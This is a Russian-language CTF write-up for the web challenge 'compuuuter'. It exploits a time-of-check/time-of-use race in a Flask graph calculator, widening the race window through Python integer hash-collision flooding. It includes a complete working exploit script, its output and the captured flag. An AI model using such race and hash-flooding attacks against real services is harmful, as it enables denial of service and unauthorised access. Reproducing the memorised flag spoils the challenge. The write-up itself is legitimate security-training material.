---
title: "compuuuter"
ctf: "Кубок CTF 2026"
date: 2026-11-01
category: web
difficulty: medium
points: 100
flag_format: "ctfcup{...}"
author: "citr0n"
---

# compuuuter

## Summary

Крошечный «графовый калькулятор» на Flask прячет опкод `1337`, возвращающий флаг. Запрет на него — классический **TOCTOU**: `compute()` проверяет отсутствие типа `1337`, а затем заново читает тип узла в момент вычисления, тогда как `patch` меняет узел на месте без проверки. Через коллизии хэшей целых (`hash(n) == n % (2**61-1)`) построение таблицы узлов вырождается в O(N²) — это даёт широкое окно, в которое `PATCH` перекидывает узел в тип `1337`.

## Solution

### Шаг 1: Найти TOCTOU между `guard` и `evaluate`

Опкод `T_FLAG = 1337` отдаёт `FLAG_INT` — байты флага как little-endian число. Доступ к нему закрыт, но непоследовательно:

- `compute()` сперва зовёт `guard(nodes)` — «времени проверки» (type 1337 запрещён), и **только потом** строит `nmap` и в `evaluate()` читает `node["type"]` заново — «время использования».
- `patch_graph()` редактирует узел **на месте и без `guard`**: `node["type"] = patch["type"]`.

Значит, если после пройденного `guard`, но до чтения типа в `evaluate`, перекинуть узел в тип `1337`, вычисление вернёт флаг. Нужна гонка `compute` против `patch` в рамках одного принятого запроса `compute` (после патча граф «отравлен», и следующий `guard` его отклонит — поэтому порядок строгий).

### Шаг 2: Расширить окно гонки через hash-flooding

Комментарий `hash(n) == n % (2**61-1)` — это ключ к детерминизму. Если взять id узлов кратными `M = 2**61-1`, все они попадают в один хэш-бакет, и вставка в `nmap` (`nmap[node["id"]] = node`) становится O(N²): секунды работы между `guard` и первым `evaluate`. В это окно и прилетает `PATCH id→1337`.

На боевом стенде перед приложением стоял прокси (`Server: ugabuga`), случайно отвечавший `400 Invalid token.`, а у воркера был таймаут ~30 с (при N=5000 `compute` шёл 45 с и убивался). Поэтому: N=3000 (окно ~15 с, весь `compute` укладывается в таймаут), каждый запрос с ретраями, а `patch` шлём только когда `compute` уже принят прокси и «ушёл в долгую» (жив >1.2 с — значит `guard` позади, идёт сборка `nmap`).

```python
#!/usr/bin/env python3
import sys, time, threading, json
import urllib.request, urllib.error

BASE = sys.argv[1].rstrip("/") if len(sys.argv) > 1 else "http://127.0.0.1:3000"
N = int(sys.argv[2]) if len(sys.argv) > 2 else 3000
M = 2**61 - 1          # id кратны M -> одинаковый hash -> один бакет -> O(N^2)
FLAG_ID = 0            # узел, который перекидываем в тип 1337

def _req(path, obj, method):
    data = json.dumps(obj).encode()
    r = urllib.request.Request(BASE + path, data=data,
                               headers={"Content-Type": "application/json"},
                               method=method)
    return urllib.request.urlopen(r, timeout=120)

def call(path, obj, method, label=""):
    """Ретраим только отбивки шлюза (Invalid token / обрыв)."""
    for _ in range(10000):
        t = time.time()
        try:
            return time.time() - t, json.load(_req(path, obj, method))
        except urllib.error.HTTPError as e:
            if e.code == 400 and b"Invalid token" in e.read()[:60]:
                continue
            raise RuntimeError(f"{label} app error {e.code}")
        except Exception:
            continue
    raise RuntimeError(f"{label} out of retries")

def build_nodes():
    return [{"id": i * M, "type": 1, "value": 0} for i in range(N)]  # все CONST=0

def attempt(k):
    print(f"\n=== attempt {k} (N={N}) ===")
    _, up = call("/api/graph", {"nodes": build_nodes()}, "POST", "upload")
    gid = up["id"]
    print(f"[+] uploaded gid={gid} nodes={up['node_count']}")

    st = {}
    def run_compute():
        for _ in range(10000):
            st["t"] = time.time(); st["pending"] = True
            try:
                st["res"] = json.load(_req(f"/api/graph/{gid}/compute", {}, "POST"))
                st["pending"] = False; return
            except urllib.error.HTTPError as e:
                st["pending"] = False
                if e.code == 400 and b"Invalid token" in e.read()[:60]:
                    continue
                st["err"] = f"app {e.code}"; return
            except Exception:
                st["pending"] = False; continue
        st["err"] = "compute out of retries"

    th = threading.Thread(target=run_compute, daemon=True); th.start()

    patched = False
    deadline = time.time() + 180
    while time.time() < deadline:
        if "res" in st or "err" in st:
            break
        # compute принят прокси и жив >1.2с -> guard позади, идёт сборка nmap
        if not patched and st.get("pending") and time.time() - st["t"] > 1.2:
            call(f"/api/graph/{gid}", {"id": FLAG_ID, "type": 1337, "args": []},
                 "PATCH", "patch")
            print(f"[+] patch landed: node {FLAG_ID} -> 1337")
            patched = True
        time.sleep(0.05)

    th.join(timeout=180)
    if "err" in st:
        print(f"[-] compute failed: {st['err']}"); return None
    res = st.get("res", {}).get("results")
    if not res:
        return None
    val = int(res[str(FLAG_ID)])
    if val == 0:
        print("[-] race not won (node still 0)"); return None
    return val.to_bytes((val.bit_length() + 7) // 8, "little").decode(errors="replace")

def main():
    for k in range(1, 40):
        try:
            f = attempt(k)
        except RuntimeError as e:
            print("[-]", e); f = None
        if f:
            print("\n[+] FLAG:", f); return
    print("[-] gave up")

if __name__ == "__main__":
    main()
```

Запуск (флаг получен с первой попытки):

```bash
python3 exploit.py https://tzbpmcnf9v0jgqcp.instances.ctfcup.online 3000
```

```
=== attempt 1 (N=3000) ===
[+] uploaded gid=82019be8cbbf41b498907a59ae6c9ff1 nodes=3000
[+] patch landed: node 0 -> 1337
[+] FLAG: ctfcup{9cd591ac67dd2dc2b6f439b2c88617be_a53349eaf157108e}
```

## Flag

```
ctfcup{9cd591ac67dd2dc2b6f439b2c88617be_a53349eaf157108e}
```
